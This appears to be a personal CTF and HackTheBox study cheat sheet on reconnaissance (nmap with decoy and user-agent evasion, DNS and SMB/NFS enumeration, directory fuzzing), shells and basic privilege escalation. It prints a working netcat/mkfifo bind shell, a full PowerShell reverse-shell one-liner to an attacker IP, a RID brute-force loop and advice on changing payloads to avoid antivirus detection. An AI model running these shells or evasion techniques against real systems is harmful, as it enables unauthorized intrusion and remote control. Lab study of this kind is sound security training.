# Basic Info gathering

### Whatweb

example: ```whatweb 10.10.10.121```



### Robots.txt

## Nmap
Even though this rather simple, don't underestimate

/nmaplowercheck1755574551 /NmapUpperCheck1755574720 Lying in nmap source code,

using: ```--script-args http.useragent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" ```

This will remove the exposed ```"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"``` when using normal sSCV scan

### Favourite scan

This will reveal basically everything. However take a lot of time

    nmap -sSCV -AT4 -v -O -p- <IP>

### Script (NSE)

A very fascinating mechanic

All NSE script is stored in ```/usr/share/nmap/scripts```

```sudo nmap 10.129.2.28 -p 25 --script banner,smtp-commands```

### Nmap Firewall and IDS/IPS Evasion

#### Decoys technique 

```
-Pn         DIsable ICMP Echo Request
-n          Disables DNS resolution.
--disable-arp-ping	Disables ARP ping.
--packet-trace	Shows all packets sent and received.
-D RND:5    Generates five random IP addresses that indicates the source IP the connection comes from.
-S <IP>     Scans the target by using different source IP address.
-e tun0     Sends all requests through the specified interface. (We can use Tornet to have tor interface, and scanning from there)
```

#### Ip range scan

```nmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d" " -f5```

Output sample:
- 10.129.2.4
- 10.129.2.10
- 10.129.2.11
- 10.129.2.18
- 10.129.2.19
- 10.129.2.20
- 10.129.2.28

you can push them into a hosts.lst and do this

```nmap -sn -oA tnet -iL hosts.lst```
```
-iL : Performs defined scans against targets in provided 'hosts.lst' list.
-oA tnet: Stores the results in all formats starting with the name 'tnet'.
-sn: disable port scanning
To make range scan even more natural, we can use -PE
-PE: Performs the ping scan by using 'ICMP Echo requests' against the target.
-Pn to disable ICMP echo
--disable-arp-ping
```

Scan top 100 port: ```-F``` Can save significant time. In CTF, I use this right at the moment I have target. After this I run another nmap heavy scan, so I can have something to do of while waiting for that heavy scan to run.

`--reason: Displays the reason a port is in a particular state.`

Example:   `100/udp closed unknown port-unreach ttl 64`


#### UDP scan

All previous technique is TCP scan. Which is a lot more reliable in general. So likely that path will be guarded heavier. So we can using UDP scan

Enable TCP scan: ```-sU```

## DNS tool

| Tool                       | Key Features                                                                                            | Use Cases                                                                                                                               |
|----------------------------|---------------------------------------------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------------|
| dig                        | Versatile DNS lookup tool that supports various query types (A, MX, NS, TXT, etc.) and detailed output. | Manual DNS queries, zone transfers (if allowed), troubleshooting DNS issues, and in-depth analysis of DNS records.                      |
| nslookup                   | Simpler DNS lookup tool, primarily for A, AAAA, and MX records.                                         | Basic DNS queries, quick checks of domain resolution and mail server records.                                                           |
| host                       | Streamlined DNS lookup tool with concise output.                                                        | Quick checks of A, AAAA, and MX records.                                                                                                |
| dnsenum                    | Automated DNS enumeration tool, dictionary attacks, brute-forcing, zone transfers (if allowed).         | Discovering subdomains and gathering DNS information efficiently.                                                                       |
| fierce                     | DNS reconnaissance and subdomain enumeration tool with recursive search and wildcard detection.         | User-friendly interface for DNS reconnaissance, identifying subdomains and potential targets.                                           |
| dnsrecon                   | Combines multiple DNS reconnaissance techniques and supports various output formats.                    | Comprehensive DNS enumeration, identifying subdomains, and gathering DNS records for further analysis.                                  |
| theHarvester               | OSINT tool that gathers information from various sources, including DNS records (email addresses).      | Collecting email addresses, employee information, and other data associated with a domain from multiple sources.                        |
| Online DNS Lookup Services | User-friendly interfaces for performing DNS lookups.                                                    | Quick and easy DNS lookups, convenient when command-line tools are not available, checking for domain availability or basic information |

### Dig

Basic Dig command usecase

```dig domain.com```    Performs a default A record lookup for the domain.

```dig domain.com A```	    Retrieves the IPv4 address (A record) associated with the domain.

```dig domain.com AAAA```	Retrieves the IPv6 address (AAAA record) associated with the domain.

```dig domain.com MX```	Finds the mail servers (MX records) responsible for the domain.

```dig domain.com NS```	Identifies the authoritative name servers for the domain.

```dig domain.com TXT```	Retrieves any TXT records associated with the domain.

```dig domain.com CNAME```	Retrieves the canonical name (CNAME) record for the domain.

```dig domain.com SOA```	Retrieves the start of authority (SOA) record for the domain.

```dig @1.1.1.1 domain.com```	Specifies a specific name server to query; in this case 1.1.1.1

```dig +trace domain.com```	Shows the full path of DNS resolution.

```dig -x 192.168.1.1```	Performs a reverse lookup on the IP address 192.168.1.1 to find the associated host name. You may need to specify a name server.

```dig +short domain.com```	Provides a short, concise answer to the query.

`dig +noall +answer domain.com`	Displays only the answer section of the query output.

`dig domain.com ANY	Retrieves` all available DNS records for the domain (Note: Many DNS servers ignore ANY queries to reduce load and prevent abuse, as per RFC 8482).

Example: `dig axfr @nsztm1.digi.ninja zonetransfer.me`  @ is at dns server IP or domain


## dns enumumeration tools

    dnsenum	    Comprehensive DNS enumeration tool that supports dictionary and brute-force attacks for discovering subdomains.
    fierce	    User-friendly tool for recursive subdomain discovery, featuring wildcard detection and an easy-to-use interface.
    dnsrecon	Versatile tool that combines multiple DNS reconnaissance techniques and offers customisable output formats.
    amass	    Actively maintained tool focused on subdomain discovery, known for its integration with other tools and extensive data sources.
    assetfinder	Simple yet effective tool for finding subdomains using various techniques, ideal for quick and lightweight scans.
    puredns	    Powerful and flexible DNS brute-forcing tool, capable of resolving and filtering results effectively.

### dnsenum

```dnsenum --enum inlanefreight.com -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -r```

# Footprinting

## WhatWeb technique

| Tool                       | Description                                                                                                           | Features                                                                                                                                |
|----------------------------|-----------------------------------------------------------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------------|
| Wappalyzer                 | Browser extension and online service for website technology profiling.                                                | Identifies a wide range of web technologies, including CMSs, frameworks, analytics tools, and more.                                     |
| BuiltWith                  | Web technology profiler that provides detailed reports on a website's technology stack.                               | Offers both free and paid plans with varying levels of detail.                                                                          |
| WhatWeb                    | Command-line tool for website fingerprinting.                                                                         | Uses a vast database of signatures to identify various web technologies.                                                                |
| Nmap                       | Versatile network scanner that can be used for various reconnaissance tasks, including service and OS fingerprinting. | Can be used with scripts (NSE) to perform more specialised fingerprinting.                                                              |
| Netcraft                   | Offers a range of web security services, including website fingerprinting and security reporting.                     | Provides detailed reports on a website's technology, hosting provider, and security posture.                                            |
| wafw00f                    | Command-line tool specifically designed for identifying Web Application Firewalls (WAFs).                             | Helps determine if a WAF is present and, if so, its type and configuration.                                                             |

## Robots.txt rules

| Directive   | Description                                                                                                      | Example                                                    |
|-------------|------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------|
| Disallow    | Specifies paths or patterns that the bot should not crawl.                                                       | Disallow: /admin/ (disallow access to the admin directory) |
| Allow       | Explicitly permits the bot to crawl specific paths or patterns, even if they fall under a broader Disallow rule. | Allow: /public/ (allow access to the public directory)     |
| Crawl-delay | Sets a delay (in seconds) between successive requests from the bot to avoid overloading the server.              | Crawl-delay: 10 (10-second delay between requests)         |
| Sitemap     | Provides the URL to an XML sitemap for more efficient crawling.                                                  | Sitemap: https://www.example.com/sitemap.xml               |

## SMB

```
Basic SMB config
[sharename]	The name of the network share.
workgroup = WORKGROUP/DOMAIN	Workgroup that will appear when clients query.
path = /path/here/	        The directory to which user is to be given access.
server string = STRING	    The string that will show up when a connection is initiated.
unix password sync = yes	Synchronize the UNIX password with the SMB password?
usershare allow guests = yes	Allow non-authenticated users to access defined share?
map to guest = bad user	    What to do when a user login request doesn't match a valid UNIX user?
browseable = yes	        Should this share be shown in the list of available shares?
guest ok = yes	            Allow connecting to the service without using a password?
read only = yes	            Allow users to read files only?
create mask = 0700	        What permissions need to be set for newly created files?
```

### SMB client

List shares: ```smbclient -N -L //10.129.14.128 ```

Connect to share after list```smbclient //10.129.14.128/notes```

### RPCclient

Basic login: ```rpcclient -U "" 10.129.14.128```

After login, there are some basic info you can query
```
Query	            Description
srvinfo	            Server information.
enumdomains	        Enumerate all domains that are deployed in the network.
querydominfo	    Provides domain, server, and user information of deployed domains.
netshareenumall	    Enumerates all available shares.
netsharegetinfo <share>     Provides information about a specific share.
enumdomusers	    Enumerates all domain users.
queryuser <RID>	    Provides information about a specific user.
```

    You can also bruteforcing RIDs to login with a simple payload like this

    for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done



### Samrdump.py

This is a part of impacket ```samrdump.py 10.129.14.128```

You can access impacket executable location at ```/root/.local/bin```

### SMBmap

```smbmap -H 10.129.14.128```

### CrackMapExec

```crackmapexec smb 10.129.14.128 --shares -u '' -p ''```

### Enum4LinuxNG

Can be consider the best one by useful

```enum4linux 10.129.14.128 -A```

## NFS Network File System 

Ultilizing nmap nfs script: ```sudo nmap --script nfs* 10.129.14.128 -sV -p111,2049```

Show available NFS share: ```showmount -e 10.129.14.128```

NFS can't connect like normal, the best way to working around is mouting

    mkdir target-NFS
    sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock
    cd target-NFS

After done: ```umount target-NFS```



## Dir travel technique

### gobuster

example: ```gobuster dir -u https://example.com -w /wordlists/Discovery/Web-Content/big.txt -t 4 ```

Gobuster is especially good for subdomain fuzz in local DNS system `gobuster vhost -u http://inlanefreight.htb:52295 -w /home/bbb/SecLists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain`

### ffuf

Normal fuzz:
```ffuf -u 'http://10.10.10.121/wordpress/FUZZ' -w /home/bbb/CTF/Selects/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt```

Subdomain fuzz:
```ffuf -H "Host: FUZZ.editor.htb" -u 'http://editor.htb' -w /home/bbb/CTF/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -fs 4605```





# Reverse shell

### Netcat

```nc -nlvp 1234```

```
-l	Listen mode, to wait for a connection to connect to us.
-v	Verbose mode, so that we know when we receive a connection.
-n 	Disable DNS resolution and only connect from/to IPs, to speed up the connection.
-p 	port? maybe
```

`nc -nv 10.129.41.200 7777`: Establish a connect to target port, opposite way from listening. This is not recommended way since system mostly have strict income firewall, so ultilizing outcoming network is better way.



### Upgrade TTY

```python -c 'import pty; pty.spawn("/bin/bash")'```

### Default webroot location

```
Apache	/var/www/html/
Nginx	/usr/local/nginx/html/
IIS	    c:\\inetpub\\wwwroot\\
XAMPP	C:\\xampp\\htdocs\\
```

### Some useful command
`env`: This will extract a bunch of environment variable current system have, something like that. Don't require root to do so

# Shell & Payload (Exploitation section)

### Basic TCP binding shell

Binding Shell to a TCP session: 

    rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f

A command like this can be detailed explain like this

- `rm -f /tmp/f;`: Removes the /tmp/f file if it exists, -f causes rm to ignore nonexistent files. The semi-colon (;) is used to execute the command sequentially.

- `mkfifo /tmp/f;`: Makes a FIFO named pipe file at the location specified. In this case, /tmp/f is the FIFO named pipe file, the semi-colon (;) is used to execute the command sequentially.

- `cat /tmp/f |`: Concatenates the FIFO named pipe file /tmp/f, the pipe (|) connects the standard output of cat /tmp/f to the standard input of the command that comes after the pipe (|).

- `/bin/bash -i 2>&1 |`: Specifies the command language interpreter using the -i option to ensure the shell is interactive. 2>&1 ensures the standard error data stream (2) & standard output data stream (1) are redirected to the command following the pipe (|).

- `nc 10.10.14.12 7777 > /tmp/f:`Uses Netcat to send a connection to our attack host 10.10.14.12 listening on port 7777. The output will be redirected (>) to /tmp/f, serving the Bash shell to our waiting Netcat listener when the reverse shell one-liner command is executed


        You can playing around with one port -nlvp and one port -nv to it. This is a basic TCP communication at network level. A very foundation of our internet.


In windows, paste something like this into CMD: 
    
    powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

Good way to do is to put it into bat file, or paste it into notepad and copy into cmd if using RDP. In short, this command must be pasted inside Command-Prompt to work.

A command like this can be detailed explain like this: 

- `powershell -nop -c`: Executes powershell.exe with no profile (nop) and executes the command/script block (-c) contained in the quotes. 

- `"$client = New-Object System.Net.Sockets.TCPClient(10.10.14.158,443);`: Sets/evaluates the variable $client equal to (=) the New-Object cmdlet, which creates an instance of the System.Net.Sockets.TCPClient .NET framework object. The .NET framework object will connect with the TCP socket listed in the parentheses (10.10.14.158,443). The semi-colon (;) ensures the commands & code are executed sequentially.

- `$stream = $client.GetStream();`: Sets/evaluates the variable $stream equal to (=) the $client variable and the .NET framework method called GetStream that facilitates network communications. The semi-colon (;) ensures the commands & code are executed sequentially.

- `[byte[]]$bytes = 0..65535|%{0};`: Creates a byte type array ([]) called $bytes that returns 65,535 zeros as the values in the array. This is essentially an empty byte stream that will be directed to the TCP listener on an attack box awaiting a connection.

- `while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)`: Starts a while loop containing the $i variable set equal to (=) the .NET framework Stream.Read ($stream.Read) method. The parameters: buffer ($bytes), offset (0), and count ($bytes.Length) are defined inside the parentheses of the method.

- `{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);`: Sets/evaluates the variable $data equal to (=) an ASCII encoding .NET framework class that will be used in conjunction with the GetString method to encode the byte stream ($bytes) into ASCII. In short, what we type won't just be transmitted and received as empty bits but will be encoded as ASCII text. The semi-colon (;) ensures the commands & code are executed sequentially.

- `$sendback = (iex $data 2>&1 | Out-String );`: Sets/evaluates the variable $sendback equal to (=) the Invoke-Expression (iex) cmdlet against the $data variable, then redirects the standard error (2>) & standard output (1) through a pipe (|) to the Out-String cmdlet which converts input objects into strings. Because Invoke-Expression is used, everything stored in $data will be run on the local computer. The semi-colon (;) ensures the commands & code are executed sequentially.

- `$sendback2 = $sendback + 'PS ' + (pwd).path + '> ';`: Sets/evaluates the variable $sendback2 equal to (=) the $sendback variable plus (+) the string PS ('PS') plus + path to the working directory ((pwd).path) plus (+) the string '> '. This will result in the shell prompt being PS C:\workingdirectoryofmachine >. The semi-colon (;) ensures the commands & code are executed sequentially. Recall that the + operator in programming combines strings when numerical values aren't in use, with the exception of certain languages like C and C++ where a function would be needed.

- `$sendbyte=  ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}`: Sets/evaluates the variable $sendbyte equal to (=) the ASCII encoded byte stream that will use a TCP client to initiate a PowerShell session with a Netcat listener running on the attack box.

- `$client.Close()"`: This is the TcpClient.Close method that will be used when the connection is terminated.

A very popular payload to use, so in order to using this efficiently, you have to modified it your own way to prevent detection.

HackTheBox pitch of this section.

    Payloads Take Different Shapes and Forms
    Understanding what different types of payloads are doing can help us understand why AV is blocking us from execution and give us some idea of what we might need to change in our code to bypass restrictions. This is something we will explore further in this module. For now, understand that the payloads we use to get a shell on a system will largely be determined by what OS, shell interpreter languages, and even programming languages are present on the target.

    Not all payloads are one-liners and deployed manually like those we studied in this section. Some are generated using automated attack frameworks and deployed as a pre-packaged/automated attack to obtain a shell. Like in the very powerful Metasploit-framework, which we will work with in the next section.

### Metasploit



# Priviledge Escalation

### Bash/SSH
A very simple thing to do: ```sudo -l```

An really simple problem I encountered is this. ```(user2 : user2) NOPASSWD: /bin/bash```

For this case, just use ```sudo -u user2 /bin/bash```. 

In most priviled escalation in CTF. ```id_rsa``` file will be "Viewable" by a user. Copy to a file, then connect to the user that own that ```id_rsa``` with

SSH with rsa file: ```ssh root@IP -p port -i KeyFile```

### TCP/IP File Transfering
```python3 -m http.server 8000```

Alternative of WinSCP ```scp linenum.sh user@remotehost:/tmp/linenum.sh``` 

Don't forget to integrity check with MD5sum if possible